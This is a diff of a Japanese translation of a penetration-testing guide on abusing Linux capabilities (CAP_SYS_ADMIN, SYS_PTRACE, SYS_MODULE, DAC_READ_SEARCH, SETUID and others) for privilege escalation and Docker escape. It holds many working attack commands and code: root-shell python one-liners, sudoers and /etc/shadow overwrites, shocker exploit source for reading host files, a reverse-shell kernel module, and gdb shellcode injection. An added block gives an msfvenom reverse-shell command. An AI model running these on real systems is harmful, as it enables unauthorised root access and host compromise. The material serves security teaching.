@@ -27,9 +27,9 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 Linux capabilities は **root 権限をより小さく、異なる単位に分割**し、プロセスが特定の権限のサブセットを持つことを可能にします。これにより、不要に完全な root 権限を付与することなくリスクを最小限に抑えます。
 
 ### 問題:
-- 通常のユーザーは制限された権限を持ち、root アクセスを必要とするネットワークソケットのオープンなどのタスクに影響を与えます。
+- 通常のユーザーは制限された権限を持ち、root アクセスを必要とするネットワークソケットを開くなどのタスクに影響を与えます。
 
-### Capability Sets:
+### 権限セット:
 
 1. **Inherited (CapInh)**:
 - **目的**: 親プロセスから引き継がれる権限を決定します。
@@ -38,23 +38,23 @@ Linux capabilities は **root 権限をより小さく、異なる単位に分�
 
 2. **Effective (CapEff)**:
 - **目的**: プロセスが現在利用している実際の権限を表します。
-- **機能**: さまざまな操作の許可を与えるためにカーネルによってチェックされる権限のセットです。ファイルに対しては、このセットがファイルの許可された権限が有効であるかどうかを示すフラグになることがあります。
-- **重要性**: 有効なセットは即時の権限チェックにとって重要であり、プロセスが使用できるアクティブな権限のセットとして機能します。
+- **機能**: これは、さまざまな操作の許可を与えるためにカーネルによってチェックされる権限のセットです。ファイルに対しては、このセットがファイルの許可された権限が有効と見なされるかどうかを示すフラグになることがあります。
+- **重要性**: 有効なセットは、即時の権限チェックにとって重要であり、プロセスが使用できるアクティブな権限のセットとして機能します。
 
 3. **Permitted (CapPrm)**:
 - **目的**: プロセスが持つことができる最大の権限のセットを定義します。
 - **機能**: プロセスは、許可されたセットから有効なセットに権限を昇格させ、その権限を使用できるようにします。また、許可されたセットから権限を削除することもできます。
-- **境界**: プロセスが持つことができる権限の上限として機能し、プロセスが事前に定義された権限の範囲を超えないようにします。
+- **境界**: これは、プロセスが持つことができる権限の上限として機能し、プロセスが事前に定義された権限の範囲を超えないようにします。
 
 4. **Bounding (CapBnd)**:
-- **目的**: プロセスがライフサイクルの間に取得できる権限に上限を設けます。
-- **機能**: プロセスが引き継ぎ可能または許可されたセットに特定の権限を持っていても、その権限がバウンディングセットにも含まれていない限り、その権限を取得することはできません。
+- **目的**: プロセスがそのライフサイクルの間に取得できる権限に上限を設けます。
+- **機能**: プロセスが引き継げるまたは許可されたセットに特定の権限を持っていても、その権限がバウンディングセットにも含まれていない限り、その権限を取得することはできません。
 - **使用例**: このセットは、プロセスの権限昇格の可能性を制限するのに特に役立ち、追加のセキュリティ層を提供します。
 
 5. **Ambient (CapAmb)**:
 - **目的**: 通常はプロセスの権限が完全にリセットされる `execve` システムコールを通じて、特定の権限を維持できるようにします。
 - **機能**: 関連するファイル権限を持たない非 SUID プログラムが特定の権限を保持できることを保証します。
-- **制限**: このセットの権限は、引き継ぎ可能および許可されたセットの制約を受け、プロセスの許可された権限を超えないようにします。
+- **制限**: このセットの権限は、引き継げるセットと許可されたセットの制約を受け、プロセスの許可された権限を超えないようにします。
 ```python
 # Code to demonstrate the interaction of different capability sets might look like this:
 # Note: This is pseudo-code for illustrative purposes only.
@@ -147,7 +147,7 @@ _getpcaps_ツールは、特定のスレッドの利用可能な能力を照会�
 getcap /usr/bin/ping
 /usr/bin/ping = cap_net_raw+ep
 ```
-バイナリに**能力を持つものを検索**するには、次のコマンドを使用します:
+バイナリの**能力を持つものを検索**するには、次のコマンドを使用します:
 ```bash
 getcap -r / 2>/dev/null
 ```
@@ -164,9 +164,9 @@ _capsh_自体の出力に加えて、_tcpdump_コマンド自体もエラーを�
 
 このエラーは、pingコマンドがICMPソケットを開くことが許可されていないことを明確に示しています。これで、これが期待通りに機能することが確実になりました。
 
-### 能力の削除
+### 機能の削除
 
-バイナリの能力を削除することができます。
+バイナリの機能を削除することができます。
 ```
 ```bash
 setcap -r </path/to/binary>
@@ -300,7 +300,7 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 
 ### 能力対応/能力無視バイナリ
 
-**能力対応バイナリは、環境によって与えられた新しい能力を使用しません**が、**能力無視バイナリはそれらを使用します**。これは、能力無視バイナリがそれらを拒否しないためです。これにより、特定の環境内でバイナリに能力を付与することができるため、能力無視バイナリが脆弱になります。
+**能力対応バイナリは、環境によって与えられた新しい能力を使用しません**が、**能力無視バイナリはそれらを使用します**。これは、能力無視バイナリがそれらを拒否しないためです。このため、特定の環境内でバイナリに能力を付与することにより、能力無視バイナリが脆弱になります。
 
 ## サービスの能力
 
@@ -311,7 +311,7 @@ Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 User=bob
 AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
-## Capabilities in Docker Containers
+## Dockerコンテナの能力
 
 デフォルトでは、Dockerはコンテナにいくつかの能力を割り当てます。これらの能力が何であるかを確認するのは非常に簡単です。次のコマンドを実行します:
 ```bash
@@ -336,7 +336,7 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 
 ## Privesc/Container Escape
 
-Capabilitiesは、**特権操作を実行した後に自分のプロセスを制限したい場合**に便利です（例：chrootを設定し、ソケットにバインドした後）。しかし、悪意のあるコマンドや引数を渡すことで、rootとして実行される可能性があります。
+能力は、**特権操作を実行した後に自分のプロセスを制限したい場合**に便利です（例：chrootを設定し、ソケットにバインドした後）。しかし、悪意のあるコマンドや引数を渡すことで、rootとして実行される可能性があります。
 
 `setcap`を使用してプログラムに能力を強制し、`getcap`を使用してこれを照会できます：
 ```bash
@@ -363,13 +363,14 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**Capabilities** が `tcpdump` に必要で、**任意のユーザーがパケットをスニッフィングできる**ようにするには:
+**Capabilities** needed by `tcpdump` to **allow any user to sniff packets**:  
+必要な**能力** `tcpdump` によって **任意のユーザーがパケットをスニッフィングできるようにする**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
 /usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
 ```
-### 特殊な「空の」能力のケース
+### "空"の能力の特別なケース
 
 [ドキュメントから](https://man7.org/linux/man-pages/man7/capabilities.7.html): プログラムファイルに空の能力セットを割り当てることができるため、実行するプロセスの有効および保存されたセットユーザーIDを0に変更するセットユーザーIDルートプログラムを作成することが可能ですが、そのプロセスに能力を付与しません。言い換えれば、次の条件を満たすバイナリがある場合：
 
@@ -377,7 +378,7 @@ getcap /usr/sbin/tcpdump
 2. `SUID`/`SGID`ビットが設定されていない
 3. 空の能力セットが設定されている（例：`getcap myelf`が`myelf =ep`を返す）
 
-そのバイナリは**rootとして実行されます**。
+その**バイナリはrootとして実行されます**。
 
 ## CAP\_SYS\_ADMIN
 
@@ -388,7 +389,7 @@ getcap /usr/sbin/tcpdump
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_admin+ep
 ```
-Pythonを使用して、実際の _passwd_ ファイルの上に修正された _passwd_ ファイルをマウントできます：
+Pythonを使用すると、実際の _passwd_ ファイルの上に修正された _passwd_ ファイルをマウントできます：
 ```bash
 cp /etc/passwd ./ #Create a copy of the passwd file
 openssl passwd -1 -salt abc password #Get hash of "password"
@@ -424,7 +425,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-内部の出力には、SYS\_ADMIN能力が有効になっていることが示されています。
+内部の前の出力では、SYS\_ADMIN能力が有効になっているのがわかります。
 
 * **マウント**
 
@@ -442,8 +443,8 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 ```
 * **フルアクセス**
 
-前の方法では、dockerホストディスクにアクセスすることができました。\
-ホストが**ssh**サーバーを実行していることがわかった場合、**dockerホスト**ディスク内にユーザーを**作成し**、SSH経由でアクセスすることができます：
+前の方法では、docker ホストのディスクにアクセスすることができました。\
+ホストが **ssh** サーバーを実行していることがわかった場合、**docker ホスト** ディスク内にユーザーを作成し、SSH 経由でアクセスすることができます：
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -459,9 +460,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP\_SYS\_PTRACE
 
-**これは、ホスト内で実行されているプロセスにシェルコードを注入することでコンテナから脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするには、コンテナを少なくとも **`--pid=host`** で実行する必要があります。
+**これは、ホスト内で実行されているプロセスにシェルコードを注入することでコンテナを脱出できることを意味します。** ホスト内で実行されているプロセスにアクセスするには、コンテナは少なくとも **`--pid=host`** で実行する必要があります。
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供されるデバッグおよびシステムコールトレース機能を使用する能力を付与し、`process_vm_readv(2)` や `process_vm_writev(2)` のようなクロスメモリアタッチ呼び出しを可能にします。診断および監視目的には強力ですが、`CAP_SYS_PTRACE` が `ptrace(2)` に対するセキュリティ制限のない状態で有効になっていると、システムのセキュリティが大きく損なわれる可能性があります。特に、他のセキュリティ制限、特に seccomp によって課せられた制限を回避するために悪用される可能性があり、[このような概念実証 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) によって示されています。
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、`ptrace(2)` によって提供されるデバッグおよびシステムコールトレース機能を使用する能力を付与し、`process_vm_readv(2)` や `process_vm_writev(2)` のようなクロスメモリアタッチ呼び出しを可能にします。診断および監視目的には強力ですが、`CAP_SYS_PTRACE` が `ptrace(2)` に対する seccomp フィルターのような制限措置なしで有効になっている場合、システムのセキュリティを大幅に損なう可能性があります。特に、他のセキュリティ制限、特に seccomp によって課せられた制限を回避するために悪用される可能性があることが、[このような概念実証 (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) によって示されています。
 
 **バイナリを使用した例 (python)**
 ```bash
@@ -562,7 +563,29 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
 ```markdown
-msfvenomを使用して、gdb経由でメモリに注入するシェルコードを作成します。
+# GDBを介してメモリに注入するためのmsfvenomを使用したシェルコードの作成
+
+msfvenomを使用してシェルコードを作成するには、以下のコマンドを使用します。
+
+```bash
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c
+```
+
+このコマンドは、指定したIPアドレスとポートを使用してリバースシェルを生成します。
+
+次に、生成されたシェルコードをGDBを使用してメモリに注入します。
+
+```bash
+gdb <your_target_program>
+```
+
+GDBが起動したら、以下のコマンドを使用してシェルコードを注入します。
+
+```gdb
+set {char[<size>]}<address> = {<shellcode>}
+```
+
+これにより、指定したアドレスにシェルコードが注入されます。
 ```
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
@@ -576,7 +599,7 @@ buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
 buf += b"\x0f\x05"
 
 # Divisible by 8
-payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+payload = b"\x90" * (-len(buf) % 8) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
@@ -589,28 +612,30 @@ print(f"set {{long}}($rip+{i}) = {chunks}")
 ```
 ルートプロセスをgdbでデバッグし、以前に生成されたgdbの行をコピー＆ペーストします:
 ```bash
+# Let's write the commands to a file
+echo 'set {long}($rip+0) = 0x296a909090909090
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+c' > commands.gdb
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
 /usr/bin/gdb -p $(pgrep sleep)
 [...]
-(gdb) set {long}($rip+0) = 0x296a909090909090
-(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
-(gdb) set {long}($rip+16) = 0x0002b9489748050f
-(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
-(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
-(gdb) set {long}($rip+40) = 0xceff485e036a050f
-(gdb) set {long}($rip+48) = 0x6af675050f58216a
-(gdb) set {long}($rip+56) = 0x69622fbb4899583b
-(gdb) set {long}($rip+64) = 0x8948530068732f6e
-(gdb) set {long}($rip+72) = 0x050fe689485752e7
-(gdb) c
+(gdb) source commands.gdb
 Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
 ```
 **環境の例 (Dockerブレイクアウト) - 別のgdbの悪用**
 
-もし**GDB**がインストールされている場合（または`apk add gdb`や`apt install gdb`でインストールできます）、**ホストからプロセスをデバッグ**し、`system`関数を呼び出すことができます。（この技術は`SYS_ADMIN`の権限も必要です）**。**
+**GDB** がインストールされている場合（または `apk add gdb` や `apt install gdb` でインストールできます）には、**ホストからプロセスをデバッグ**し、`system` 関数を呼び出すことができます。（この技術は `SYS_ADMIN` 権限も必要です）**。**
 ```bash
 gdb -p 1234
 (gdb) call (void)system("ls")
@@ -638,7 +663,7 @@ uid=0(root)
 gid=0(root)
 groups=0(root
 ```
-リスト **プロセス** ホストで `ps -eaf`
+リスト **プロセス** が実行中の **ホスト** `ps -eaf`
 
 1. **アーキテクチャ** を取得 `uname -m`
 2. アーキテクチャ用の **シェルコード** を見つける ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
@@ -648,12 +673,12 @@ groups=0(root
 
 ## CAP\_SYS\_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** は、プロセスに **カーネルモジュールをロードおよびアンロードする権限を与えます（`init_module(2)`、`finit_module(2)` および `delete_module(2)` システムコール）**。これにより、カーネルのコア操作に直接アクセスできるようになります。この能力は重大なセキュリティリスクをもたらし、カーネルの変更を可能にすることで特権昇格やシステム全体の侵害を引き起こし、Linuxセキュリティモジュールやコンテナの隔離を含むすべてのLinuxセキュリティメカニズムを回避します。
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** はプロセスに **カーネルモジュールをロードおよびアンロードする権限を与えます（`init_module(2)`、`finit_module(2)` および `delete_module(2)` システムコール）**。これにより、カーネルのコア操作に直接アクセスできるようになります。この機能は重大なセキュリティリスクをもたらし、特権昇格やシステム全体の侵害を可能にします。カーネルの変更を許可することで、Linuxのセキュリティメカニズム、Linux Security Modulesやコンテナの隔離をすべてバイパスします。
 **これは、ホストマシンのカーネルにカーネルモジュールを** **挿入/削除** **できることを意味します。**
 
 **バイナリの例**
 
-次の例では、バイナリ **`python`** がこの能力を持っています。
+次の例では、バイナリ **`python`** がこの機能を持っています。
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
@@ -664,25 +689,25 @@ getcap -r / 2>/dev/null
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
-次に、**以下に2つの例があるカーネルモジュールをコンパイルし、**このフォルダーにコピーします：
+次に、**以下に2つの例があるカーネルモジュールをコンパイルし、**このフォルダーにコピーします:**
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
-最後に、このカーネルモジュールをロードするために必要なpythonコードを実行します:
+最後に、このカーネルモジュールをロードするために必要なpythonコードを実行します：
 ```python
 import kmod
 km = kmod.Kmod()
 km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
-**例2：バイナリを使用した例**
+**例2：バイナリを使用した場合**
 
 次の例では、バイナリ **`kmod`** がこの能力を持っています。
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
-これは、**`insmod`** コマンドを使用してカーネルモジュールを挿入できることを意味します。この特権を悪用して**リバースシェル**を取得するには、以下の例に従ってください。
+これは、**`insmod`** コマンドを使用してカーネルモジュールを挿入することが可能であることを意味します。この特権を悪用して **reverse shell** を取得するために、以下の例に従ってください。
 
 **環境の例 (Dockerブレイクアウト)**
 
@@ -742,7 +767,7 @@ make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 {% endcode %}
 
 {% hint style="warning" %}
-Makefile内の各make単語の前の空白文字は**スペースではなくタブ**でなければなりません！
+Makefile内の各make単語の前の空白文字は**スペースではなくタブ**でなければなりません!
 {% endhint %}
 
 `make`を実行してコンパイルします。
@@ -766,19 +791,19 @@ insmod reverse-shell.ko #Launch the reverse shell
 
 ## CAP\_DAC\_READ\_SEARCH
 
-[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスが **ファイルの読み取りおよびディレクトリの読み取りと実行のための権限をバイパスする**ことを可能にします。その主な用途はファイル検索または読み取りの目的です。しかし、これによりプロセスは `open_by_handle_at(2)` 関数を使用でき、プロセスのマウント名前空間の外にあるファイルを含む任意のファイルにアクセスできます。`open_by_handle_at(2)` で使用されるハンドルは、`name_to_handle_at(2)` を通じて取得された非透明な識別子であるべきですが、inode番号のような機密情報が含まれる可能性があり、改ざんに対して脆弱です。この能力の悪用の可能性、特にDockerコンテナの文脈においては、Sebastian Krahmerによってショッカーエクスプロイトで示されました。詳細は[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。
-**これは、ファイルの読み取り権限チェックとディレクトリの読み取り/実行権限チェックをバイパスできることを意味します。**
+[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、プロセスが**ファイルの読み取りおよびディレクトリの読み取りと実行のための権限をバイパスする**ことを可能にします。その主な用途はファイル検索または読み取り目的です。しかし、これによりプロセスは `open_by_handle_at(2)` 関数を使用でき、プロセスのマウントネームスペースの外にあるファイルを含む任意のファイルにアクセスできます。`open_by_handle_at(2)` で使用されるハンドルは、`name_to_handle_at(2)` を通じて取得された非透明な識別子であるべきですが、改ざんに脆弱なinode番号などの機密情報を含む可能性があります。この能力の悪用の可能性、特にDockerコンテナの文脈においては、Sebastian Krahmerによってショッカーエクスプロイトで示されました。詳細は[こちら](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。
+**これは、ファイルの読み取り権限チェックおよびディレクトリの読み取り/実行権限チェックをバイパスできることを意味します。**
 
 **バイナリの例**
 
-バイナリは任意のファイルを読み取ることができます。したがって、tarのようなファイルがこの能力を持っている場合、shadowファイルを読み取ることができます：
+バイナリは任意のファイルを読み取ることができます。したがって、tarのようなファイルがこの能力を持っている場合、shadowファイルを読み取ることができます。
 ```bash
 cd /etc
 tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
 cd /tmp
 tar -cxf shadow.tar.gz
 ```
-**Example with binary2**
+**バイナリ2の例**
 
 この場合、**`python`** バイナリがこの能力を持っていると仮定しましょう。ルートファイルをリストするには、次のようにします:
 ```python
@@ -806,11 +831,11 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-内部の出力には、**DAC\_READ\_SEARCH** 権限が有効であることが示されています。その結果、コンテナは **プロセスのデバッグ** が可能です。
+内部の出力には、**DAC\_READ\_SEARCH** 権限が有効になっていることが示されています。その結果、コンテナは **プロセスのデバッグ** が可能です。
 
-以下のエクスプロイトの仕組みについては [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で学ぶことができますが、要約すると **CAP\_DAC\_READ\_SEARCH** は、許可チェックなしでファイルシステムを横断することを可能にするだけでなく、_**open\_by\_handle\_at(2)**_ に対するチェックを明示的に削除し、**他のプロセスによって開かれた機密ファイルに私たちのプロセスがアクセスできる可能性がある** ということです。
+次のエクスプロイトの仕組みについては [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) で学ぶことができますが、要約すると **CAP\_DAC\_READ\_SEARCH** は、許可チェックなしでファイルシステムを横断することを可能にするだけでなく、_**open\_by\_handle\_at(2)**_ に対するチェックを明示的に削除し、**他のプロセスによって開かれた機密ファイルに私たちのプロセスがアクセスできる可能性がある** ということです。
 
-この権限を悪用してホストからファイルを読み取る元のエクスプロイトはここにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)、以下は **読み取りたいファイルを最初の引数として指定し、それをファイルにダンプすることを可能にする修正バージョンです。**
+この権限を悪用してホストからファイルを読み取る元のエクスプロイトはここにあります: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)。以下は、**読み取りたいファイルを最初の引数として指定し、それをファイルにダンプすることを可能にする修正バージョンです。**
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -972,7 +997,7 @@ return 0;
 
 <figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>
 
-​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術的知識の促進を使命として、** この会議は、あらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。
+​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は **スペイン** で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ** で最も重要なイベントの一つです。**技術知識の促進を使命として、** この会議は、あらゆる分野の技術とサイバーセキュリティの専門家が集まる熱い交流の場です。
 
 {% embed url="https://www.rootedcon.com/" %}
 
@@ -980,7 +1005,7 @@ return 0;
 
 **これは、任意のファイルに対する書き込み権限チェックをバイパスできることを意味し、任意のファイルに書き込むことができます。**
 
-特権を昇格させるために**上書きできるファイルはたくさんあります。** [**ここからアイデアを得ることができます。**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)
+特権を昇格させるために**上書きできるファイルはたくさんあります。** [**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
 **バイナリの例**
 
@@ -993,7 +1018,7 @@ vim /etc/sudoers #To overwrite it
 ```
 **Example with binary 2**
 
-この例では、**`python`** バイナリがこの能力を持ちます。あなたは python を使用して任意のファイルを上書きすることができます:
+この例では **`python`** バイナリがこの能力を持ちます。あなたはpythonを使って任意のファイルを上書きすることができます:
 ```python
 file=open("/etc/sudoers","a")
 file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
@@ -1014,8 +1039,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-まず最初に、ホストの[**DAC\_READ\_SEARCH能力を悪用して任意のファイルを読み取る**](linux-capabilities.md#cap\_dac\_read\_search)という前のセクションを読んで、**エクスプロイトをコンパイル**してください。\
-次に、ホストのファイルシステム内に**任意のファイルを書き込む**ことを可能にする**次のバージョンのショッカーエクスプロイトをコンパイル**してください：
+まず最初に、ホストの任意のファイルを読み取るために[**DAC\_READ\_SEARCH能力を悪用する**](linux-capabilities.md#cap\_dac\_read\_search)の前のセクションを読んでください。そして、**エクスプロイトをコンパイル**します。\
+次に、ホストのファイルシステム内に**任意のファイルを書き込む**ことを可能にする**次のバージョンのショッカーエクスプロイトをコンパイル**します：
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1178,7 +1203,7 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 
 **バイナリの例**
 
-もしpythonがこの能力を持っていれば、shadowファイルの権限を変更し、**rootパスワードを変更**し、特権を昇格させることができます：
+もしpythonがこの能力を持っている場合、shadowファイルの権限を変更し、**rootパスワードを変更**し、特権を昇格させることができます：
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
@@ -1205,7 +1230,7 @@ os.system("/bin/bash")
 ```
 ## CAP\_SETGID
 
-**これは、作成されたプロセスの有効なグループIDを設定できることを意味します。**
+**これは、作成されたプロセスの有効グループIDを設定できることを意味します。**
 
 特権を昇格させるために**上書きできるファイルがたくさんあります、** [**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。
 
@@ -1287,8 +1312,8 @@ CapAmb: 0000000000000000
 capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
-この能力は**バイナリに他の任意の能力を与えることを可能にします**。したがって、私たちはこのページで言及されている**他の能力のブレイクアウトを悪用して**コンテナから**脱出**することを考えることができます。\
-しかし、たとえばgdbバイナリにCAP\_SYS\_ADMINとCAP\_SYS\_PTRACEの能力を与えようとすると、それらを与えることはできますが、**バイナリはその後実行できなくなります**：
+この能力は**バイナリに他の任意の能力を与えることを可能にします**。したがって、**このページで言及されている他の能力のブレイクアウトを悪用して**コンテナから**脱出**することを考えることができます。\
+しかし、たとえばgdbバイナリにCAP\_SYS\_ADMINとCAP\_SYS\_PTRACEの能力を与えようとすると、それらを与えることはできますが、**この後バイナリは実行できなくなります**：
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1308,7 +1333,7 @@ Permitted capabilitiesは使用できる能力を制限しているようです�
 
 [**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`、または`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)`システムコールへのアクセス、さまざまなディスクコマンドを含む多くの敏感な操作を提供します。この能力を介して`FIBMAP ioctl(2)`も有効になっており、[過去に問題を引き起こした](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)ことがあります。マニュアルページによれば、これにより保持者は他のデバイスに対して**デバイス固有の操作を実行することができます**。
 
-これは**特権昇格**や**Dockerブレイクアウト**に役立つ可能性があります。
+これは**特権昇格**や**Dockerブレイクアウト**に役立ちます。
 
 ## CAP\_KILL
 
@@ -1326,7 +1351,7 @@ os.killpg(pgid, signal.SIGKILL)
 ```
 **Privesc with kill**
 
-もしあなたがkill権限を持っていて、**rootとして実行されているnodeプログラム**（または別のユーザーとして）を見つけた場合、あなたはおそらく**SIGUSR1信号**を送信して、それを**nodeデバッガー**を開かせ、接続できるようにすることができます。
+もしあなたがkill権限を持っていて、**rootとして実行されているnodeプログラム**（または別のユーザーとして） がある場合、あなたはおそらく**信号SIGUSR1**を送信して、それを**nodeデバッガー**を開かせ、接続できるようにすることができます。
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -1349,7 +1374,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 **バイナリの例**
 
-もし **`python`** がこの能力を持っていれば、任意のポートでリッスンでき、さらにそこから他のポートに接続することも可能です（いくつかのサービスは特定の特権ポートからの接続を必要とします）。
+もし **`python`** がこの能力を持っていれば、任意のポートでリッスンでき、さらにそこから他のポートに接続することもできます（いくつかのサービスは特定の特権ポートからの接続を必要とします）。
 
 {% tabs %}
 {% tab title="Listen" %}
@@ -1456,7 +1481,7 @@ iptc.easy.flush_table('filter')
 ```
 ## CAP\_LINUX\_IMMUTABLE
 
-**これは、inode属性を変更できることを意味します。** この能力を使って特権を直接昇格させることはできません。
+**これはinode属性を変更できることを意味します。** この能力を使って特権を直接昇格させることはできません。
 
 **バイナリの例**
 
@@ -1504,7 +1529,7 @@ sudo chattr -i file.txt
 
 ## CAP\_SYSLOG
 
-[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、Linux 2.6.37 でより広範な **CAP_SYS_ADMIN** から分離され、`syslog(2)` コールを使用する能力を特に付与しました。この能力により、`kptr_restrict` 設定が 1 の場合に `/proc` や類似のインターフェースを介してカーネルアドレスを表示することができます。Linux 2.6.39 以降、`kptr_restrict` のデフォルトは 0 であり、カーネルアドレスが公開されますが、多くのディストリビューションはセキュリティ上の理由からこれを 1（uid 0 以外からアドレスを隠す）または 2（常にアドレスを隠す）に設定しています。
+[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、Linux 2.6.37 でより広範な **CAP_SYS_ADMIN** から分離され、`syslog(2)` コールを使用する能力を特に付与しました。この能力により、`kptr_restrict` 設定が 1 の場合に `/proc` や類似のインターフェースを介してカーネルアドレスを表示することが可能になります。Linux 2.6.39 以降、`kptr_restrict` のデフォルトは 0 であり、カーネルアドレスが公開されますが、多くのディストリビューションはセキュリティ上の理由からこれを 1（uid 0 以外からアドレスを隠す）または 2（常にアドレスを隠す）に設定しています。
 
 さらに、**CAP_SYSLOG** は、`dmesg_restrict` が 1 に設定されている場合に `dmesg` 出力にアクセスすることを許可します。これらの変更にもかかわらず、**CAP_SYS_ADMIN** は歴史的な前例により `syslog` 操作を実行する能力を保持しています。
 
@@ -1517,7 +1542,7 @@ sudo chattr -i file.txt
 
